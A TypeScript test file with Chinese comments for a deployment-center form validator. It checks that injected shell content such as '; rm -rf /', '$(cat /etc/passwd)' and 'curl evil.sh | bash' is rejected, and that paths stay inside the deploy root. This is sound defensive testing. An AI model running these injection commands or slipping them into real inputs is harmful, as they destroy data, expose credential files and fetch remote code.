/**
 * 部署中心表单纯逻辑测试。
 *
 * 重点：
 * * `ServiceRuntime` ↔ 扁平表单的往返不能丢字段；
 * * **UI 层同样不接受 shell 内容** —— 参数行里出现 `;` / `$(...)` / `|` 一律报错，
 *   这样"模型里没有命令字符串"就从输入口就开始成立；
 * * 路径围栏（服务目录必须在环境根目录内）按目录边界判断，不能靠前缀字符串。
 */

import { describe, expect, it } from "vitest";

import {
  hasShellMeta,
  highestRisk,
  isAbsolutePath,
  isInsideRoot,
  newApplication,
  newEnvironment,
  newServiceUnit,
  numberInputValue,
  parseOptionalNumber,
  runtimeFormError,
  runtimeFormFrom,
  runtimeFromForm,
  serviceKindForRuntime,
  servicePathError,
} from "../form";

describe("文本与路径辅助", () => {
  it("认出 shell 元字符", () => {
    for (const value of ["a;b", "a && b", "`id`", "$(whoami)", "a|b", "a>b", "line\nbreak", "a'b", 'a"b']) {
      expect(hasShellMeta(value)).toBe(true);
    }
    expect(hasShellMeta("/opt/web/current")).toBe(false);
    expect(hasShellMeta("my docs")).toBe(false);
    expect(hasShellMeta("-Xmx512m")).toBe(false);
  });

  it("绝对路径判断", () => {
    expect(isAbsolutePath("/opt/web")).toBe(true);
    expect(isAbsolutePath("  /opt/web ")).toBe(true);
    expect(isAbsolutePath("opt/web")).toBe(false);
    expect(isAbsolutePath("")).toBe(false);
  });

  it("按目录边界判断包含关系（/opt/web2 不算在 /opt/web 内）", () => {
    expect(isInsideRoot("/opt/web/current", "/opt/web")).toBe(true);
    expect(isInsideRoot("/opt/web", "/opt/web")).toBe(true);
    expect(isInsideRoot("/opt/web2", "/opt/web")).toBe(false);
    expect(isInsideRoot("/opt/web/../etc", "/opt/web")).toBe(false);
    expect(isInsideRoot("/etc/nginx", "/opt/web")).toBe(false);
  });

  it("数字输入：空串是「未知」，不是 0", () => {
    expect(parseOptionalNumber("")).toBeNull();
    expect(parseOptionalNumber("  ")).toBeNull();
    expect(parseOptionalNumber("120.5")).toBe(120.5);
    expect(Number.isNaN(parseOptionalNumber("abc"))).toBe(true);
    expect(numberInputValue(null)).toBe("");
    expect(numberInputValue(0)).toBe("0");
    expect(numberInputValue(12)).toBe("12");
  });
});

describe("空实体工厂", () => {
  it("应用带服务器、环境继承应用的服务器与项目路径", () => {
    const application = { ...newApplication("s1"), id: "app-1", confirmed_project_path: "/opt/web" };
    const environment = newEnvironment(application);
    expect(application.server_id).toBe("s1");
    expect(environment.application_id).toBe("app-1");
    expect(environment.server_id).toBe("s1");
    expect(environment.deploy_root).toBe("/opt/web");
    expect(environment.kind).toBe("production");
  });

  it("服务默认是未完成的静态站点（等用户补字段）", () => {
    const unit = newServiceUnit("app-1", "env-1");
    expect(unit.status).toBe("incomplete");
    expect(unit.runtime.kind).toBe("static_nginx");
    expect(unit.service_kind).toBe("static_nginx");
  });
});

describe("运行方式 ↔ 表单", () => {
  it("docker 镜像：端口逐条往返", () => {
    const runtime = {
      kind: "docker_image" as const,
      image: "registry.example.com/acme/web",
      tag: "v1.2.3",
      container_name: "web-prod",
      ports: [{ host_port: 8080, container_port: 80, protocol: "tcp" as const }],
    };
    const form = runtimeFormFrom(runtime);
    expect(form.kind).toBe("docker_image");
    expect(form.ports).toHaveLength(1);
    expect(runtimeFromForm(form)).toEqual(runtime);
  });

  it("原生进程：参数按行切分、去掉空行与首尾空格", () => {
    const runtime = {
      kind: "native_process" as const,
      entry: "java",
      args: ["-jar", "app.jar", "--port=8080"],
    };
    const form = runtimeFormFrom(runtime);
    expect(form.args_text).toBe("-jar\napp.jar\n--port=8080");
    expect(runtimeFromForm(form)).toEqual(runtime);

    const messy = { ...form, args_text: "  -jar \n\n  app.jar  \n" };
    const cleaned = runtimeFromForm(messy);
    expect(cleaned.kind).toBe("native_process");
    if (cleaned.kind !== "native_process") throw new Error("期望 native_process");
    expect(cleaned.args).toEqual(["-jar", "app.jar"]);
  });

  it("外部托管与 compose 往返", () => {
    const external = { kind: "external" as const, endpoint: "db-prod-01:5432" };
    expect(runtimeFromForm(runtimeFormFrom(external))).toEqual(external);

    const compose = {
      kind: "docker_compose" as const,
      compose_path: "/opt/web/docker-compose.yml",
      project_name: "web",
      service: "api",
    };
    expect(runtimeFromForm(runtimeFormFrom(compose))).toEqual(compose);
  });

  it("部署形态跟随运行方式（native_process 保留用户选择的细分）", () => {
    expect(serviceKindForRuntime("static_nginx", "docker_image")).toBe("static_nginx");
    expect(serviceKindForRuntime("docker_image", "static_nginx")).toBe("docker_image");
    expect(serviceKindForRuntime("external", "static_nginx")).toBe("external_managed");
    expect(serviceKindForRuntime("native_process", "java_jar")).toBe("java_jar");
    expect(serviceKindForRuntime("native_process", "docker_image")).toBe("native_binary");
  });
});

describe("运行方式校验（UI 层也拒绝 shell 内容）", () => {
  const base = runtimeFormFrom({ kind: "static_nginx", site_name: "web", root: "/opt/web/current" });

  it("静态站点：必填 + 绝对路径", () => {
    expect(runtimeFormError(base)).toBeNull();
    expect(runtimeFormError({ ...base, site_name: "" })).toBe("This field is required");
    expect(runtimeFormError({ ...base, root: "relative" })).toBe(
      "Must be an absolute path, e.g. /opt/web",
    );
    expect(runtimeFormError({ ...base, root: "/opt/web; rm -rf /" })).toBe(
      "Shell metacharacters (; & | $ ` > <) and newlines are not allowed",
    );
  });

  it("systemd 单元名与容器名不允许元字符", () => {
    const unit = runtimeFormFrom({ kind: "systemd_unit", unit: "api.service" });
    expect(runtimeFormError(unit)).toBeNull();
    expect(runtimeFormError({ ...unit, unit: "api.service; rm -rf /" })).toContain("Shell");

    const container = runtimeFormFrom({
      kind: "docker_image",
      image: "acme/web",
      tag: "v1",
      container_name: "web",
      ports: [],
    });
    expect(runtimeFormError(container)).toBeNull();
    expect(runtimeFormError({ ...container, container_name: "web && bad" })).toContain("Shell");
  });

  it("端口必须在 1-65535", () => {
    const container = runtimeFormFrom({
      kind: "docker_image",
      image: "acme/web",
      tag: "v1",
      container_name: "web",
      ports: [{ host_port: 8080, container_port: 80, protocol: "tcp" }],
    });
    expect(runtimeFormError(container)).toBeNull();
    const zero = {
      ...container,
      ports: [{ host_port: 0, container_port: 80, protocol: "tcp" as const }],
    };
    expect(runtimeFormError(zero)).toBe("Port must be between 1 and 65535");
    const tooBig = {
      ...container,
      ports: [{ host_port: 70000, container_port: 80, protocol: "tcp" as const }],
    };
    expect(runtimeFormError(tooBig)).toBe("Port must be between 1 and 65535");
  });

  it("原生进程：参数逐行校验，注入写法直接被拒", () => {
    const process = runtimeFormFrom({ kind: "native_process", entry: "node", args: ["server.js"] });
    expect(runtimeFormError(process)).toBeNull();

    const injected = { ...process, args_text: "server.js; curl evil.sh | bash" };
    expect(runtimeFormError(injected)).toContain("Shell");

    const substituted = { ...process, args_text: "$(cat /etc/passwd)" };
    expect(runtimeFormError(substituted)).toContain("Shell");
  });

  it("compose 路径必须是绝对路径", () => {
    const compose = runtimeFormFrom({
      kind: "docker_compose",
      compose_path: "/opt/web/docker-compose.yml",
      project_name: "web",
      service: "api",
    });
    expect(runtimeFormError(compose)).toBeNull();
    expect(runtimeFormError({ ...compose, compose_path: "docker-compose.yml" })).toBe(
      "Must be an absolute path, e.g. /opt/web",
    );
  });

  it("外部托管需要 host:port", () => {
    const external = runtimeFormFrom({ kind: "external", endpoint: "db:5432" });
    expect(runtimeFormError(external)).toBeNull();
    expect(runtimeFormError({ ...external, endpoint: "db" })).toBe("This field is required");
    expect(runtimeFormError({ ...external, endpoint: "db:5432; rm -rf /" })).toContain("Shell");
  });
});

describe("服务目录围栏", () => {
  it("必须落在环境根目录之内", () => {
    expect(servicePathError("/opt/web/current", "/opt/web")).toBeNull();
    expect(servicePathError(null, "/opt/web")).toBeNull();
    expect(servicePathError("", "/opt/web")).toBeNull();
    expect(servicePathError("relative", "/opt/web")).toBe("Must be an absolute path, e.g. /opt/web");
    expect(servicePathError("/etc/nginx", "/opt/web")).toBe(
      "The service directory must be inside the environment deploy root",
    );
    expect(servicePathError("/opt/web/../etc", "/opt/web")).toBe(
      "The service directory must be inside the environment deploy root",
    );
  });
});

describe("方案摘要", () => {
  it("取最高风险", () => {
    expect(highestRisk([])).toBe("low");
    expect(highestRisk(["low", "medium"])).toBe("medium");
    expect(highestRisk(["high", "low", "critical"])).toBe("critical");
    expect(highestRisk(["critical", "high"])).toBe("critical");
  });
});
